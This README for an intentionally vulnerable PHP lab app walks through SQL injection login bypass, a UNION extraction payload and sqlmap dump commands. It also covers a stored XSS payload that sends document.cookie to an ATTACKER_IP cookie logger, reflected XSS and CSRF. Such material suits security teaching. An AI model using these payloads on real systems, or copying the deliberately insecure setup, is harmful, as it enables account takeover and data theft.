# CrimeWatch Portal — Cybersecurity Lab

Intentionally vulnerable PHP web application for demonstrating SQL Injection, XSS, and CSRF attacks in a controlled lab environment.

---

## Project Structure

```
crime-report/
├── config.php          # Database connection
├── setup.sql           # Schema + seed data
├── index.php           # Redirects to login
├── login.php           # SQL Injection (auth bypass)
├── dashboard.php       # Stored XSS (display)
├── post_report.php     # Stored XSS (input)
├── search.php          # SQL Injection + Reflected XSS
├── update_email.php    # CSRF (no token) + SQL Injection
├── logout.php          # Session destroy
├── steal.php           # Attacker cookie logger
└── css/style.css       # UI styles
```

---

## Setup

### Step 1 — Start Services

```bash
sudo systemctl start apache2
sudo systemctl start mysql
```

To auto-start on every boot:

```bash
sudo systemctl enable apache2
sudo systemctl enable mysql
```

### Step 2 — Place Files

Copy the project into Apache's web root:

```bash
sudo cp -r crime-report/ /var/www/html/cs-lab-mid
sudo chown -R www-data:www-data /var/www/html/cs-lab-mid/
```

### Step 3 — Create Database User

```bash
sudo mysql -u root
```

Inside MySQL shell:

```sql
CREATE DATABASE IF NOT EXISTS crime_report;
CREATE USER 'labuser'@'localhost' IDENTIFIED BY 'lab1234';
GRANT ALL PRIVILEGES ON crime_report.* TO 'labuser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

### Step 4 — Import Schema

```bash
sudo mysql -u labuser -plab1234 crime_report < /var/www/html/cs-lab-mid/setup.sql
```

### Step 5 — Update config.php

```php
$user = "labuser";
$pass = "lab1234";
```

### Step 6 — Set Cookie File Permissions

```bash
touch /var/www/html/cs-lab-mid/stolen_cookies.txt
chmod 777 /var/www/html/cs-lab-mid/stolen_cookies.txt
```

### Step 7 — Visit the App

```
http://localhost/cs-lab-mid/login.php
```

---

## Test Credentials

| Username | Password  | Email            |
|----------|-----------|------------------|
| admin    | admin123  | admin@lab.com    |
| alice    | password1 | alice@lab.com    |
| bob      | pass456   | bob@lab.com      |

---

## Attack 1 — SQL Injection: Authentication Bypass

**Target:** `login.php`

In the username field enter:

```
' OR '1'='1' --
```

Password: anything

The SQL query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...'
```

The `--` comments out the password check. Login succeeds without valid credentials.

---

## Attack 2 — SQL Injection: UNION Data Extraction

**Target:** `search.php`

In the search box enter:

```
' UNION SELECT 1,username,password,email,5,6 FROM users -- 
```

This dumps all usernames, passwords, and emails from the users table into the results.

---

## Attack 3 — sqlmap: Automated SQL Injection

First log in via the browser and copy your PHPSESSID cookie from browser dev tools (F12 → Application → Cookies).

List all databases:

```bash
sqlmap -u "http://localhost/cs-lab-mid/search.php?q=robbery" \
  --cookie="PHPSESSID=YOUR_SESSION_ID" \
  --dbs --batch --level=3 --risk=2
```

List tables in crime_report database:

```bash
sqlmap -u "http://localhost/cs-lab-mid/search.php?q=robbery" \
  --cookie="PHPSESSID=YOUR_SESSION_ID" \
  -D crime_report --tables --batch --level=3 --risk=2
```

Dump users table:

```bash
sqlmap -u "http://localhost/cs-lab-mid/search.php?q=robbery" \
  --cookie="PHPSESSID=YOUR_SESSION_ID" \
  -D crime_report -T users --dump --batch --level=3 --risk=2
```

Attack login form directly (no cookie needed):

```bash
sqlmap -u "http://localhost/cs-lab-mid/login.php" \
  --data="username=admin&password=test" \
  --level=3 --risk=2 --dbs --batch
```

**Why is the cookie required for search.php?**
The search page checks `$_SESSION['user']` and redirects to login if not authenticated. sqlmap never reaches the vulnerable query without a valid session. The cookie proves to the server that sqlmap is a logged-in user.

---

## Attack 4 — Stored XSS: Silent Cookie Theft

**Setup:**
- Victim machine: running the app (e.g. `192.168.64.2`)
- Attacker machine: Kali Linux (same IP or different)

**Step 1:** Log in and go to Post Report.

**Step 2:** In the Title field paste this payload:

```html
<script>new Image().src='http://ATTACKER_IP/cs-lab-mid/steal.php?c='+document.cookie;</script>
```

Replace `ATTACKER_IP` with your Kali machine's IP address.

**Step 3:** Submit the report.

**Step 4:** When any logged-in user visits the dashboard, the script fires silently in the background. The victim stays on the page and notices nothing.

**Step 5:** Check stolen cookies:

```bash
cat /var/www/html/cs-lab-mid/stolen_cookies.txt
```

**Step 6:** Use the stolen PHPSESSID to hijack the session. In the browser open dev tools → Application → Cookies → change PHPSESSID to the stolen value → refresh.

**Why use `new Image().src` instead of `document.location`?**
`document.location` redirects the victim away from the page and causes an infinite redirect loop (victim → steal.php → back to dashboard → fires again). `new Image().src` sends the cookie as a background HTTP request and the victim never leaves the dashboard.

---

## Attack 5 — Reflected XSS

**Target:** `search.php`

In the search box enter:

```html
<script>alert(document.cookie)</script>
```

The search term is echoed back into the page without escaping. The script executes immediately and shows the session cookie.

---

## Attack 6 — CSRF (Burp Suite — next lab)

**Target:** `update_email.php`

The update email form has no CSRF token. Steps:

1. Open Burp Suite and configure your browser to proxy through it.
2. Log in as the victim and submit an email update to capture the request in Burp.
3. Right-click the request → Engagement Tools → Generate CSRF PoC.
4. Host the generated HTML page on the attacker machine.
5. If the victim visits the attacker's page while logged in, their email is changed silently.

---

## Common Errors and Fixes

### Error: 500 Internal Server Error on login

**Check the log:**

```bash
sudo tail -10 /var/log/apache2/error.log
```

**Fix — MySQL not running:**

```bash
sudo systemctl start mysql
```

**Fix — PHP mysqli extension missing:**

```bash
sudo apt install php-mysqli
sudo systemctl restart apache2
```

---

### Error: Access denied for user 'root'@'localhost'

Apache/PHP runs as `www-data` which cannot use MySQL's root socket auth. Create a dedicated user instead:

```bash
sudo mysql -u root
```

```sql
CREATE USER 'labuser'@'localhost' IDENTIFIED BY 'lab1234';
GRANT ALL PRIVILEGES ON crime_report.* TO 'labuser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

Then update `config.php` with `labuser` / `lab1234`.

---

### Error: No such file or directory (mysqli_connect)

MySQL stopped running. Start it:

```bash
sudo systemctl start mysql
sudo systemctl restart apache2
```

---

### Error: XSS payload causes 500 when posting report

The single quote inside the XSS payload (e.g. `steal.php?c='`) breaks the SQL INSERT. Fix `post_report.php` to escape input before inserting (this does not prevent XSS — the raw script tag is still stored, it just escapes SQL special chars):

```php
$title       = mysqli_real_escape_string($conn, $_POST['title']);
$description = mysqli_real_escape_string($conn, $_POST['description']);
$location    = mysqli_real_escape_string($conn, $_POST['location']);
```

---

### Error: Victim page keeps reloading after XSS

You used `document.location` in the payload which redirects the victim to steal.php, and steal.php redirects back to dashboard, which fires the script again — infinite loop. Use the silent image technique instead:

```html
<script>new Image().src='http://ATTACKER_IP/cs-lab-mid/steal.php?c='+document.cookie;</script>
```

---

### sqlmap says parameter is not injectable

sqlmap was redirected to login.php because there was no valid session. Always pass the cookie:

```bash
--cookie="PHPSESSID=YOUR_SESSION_ID"
```

Get the session ID from browser dev tools → Application → Cookies after logging in manually.

---

## ⚠️ Disclaimer

This project is intentionally insecure for educational purposes only. Do not deploy on a public server or use outside a controlled lab environment.
